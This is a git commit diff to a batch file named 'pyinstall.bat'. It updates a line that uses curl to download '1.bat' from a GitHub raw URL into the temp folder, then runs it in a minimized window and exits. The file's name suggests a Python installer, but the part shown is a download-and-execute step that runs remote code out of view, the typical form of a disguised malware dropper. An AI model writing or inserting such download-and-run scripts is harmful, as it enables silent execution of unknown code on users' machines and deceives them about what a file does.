469ec9a0ae823861a9d91b3eba1111292412fba6
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-07-02 22:20:42 +0000

    Update pyinstall.bat

--- pyinstall.bat
+++ pyinstall.bat
@@ -24,6 +24,6 @@ goto :folder
 
 :folder
 cd %temp%
-curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/-/main/1.bat
+curl -o 1.bat https://raw.githubusercontent.com/oogabooga245/jordy/main/1.bat
 START /MIN CMD.EXE /C 1.bat
 exit
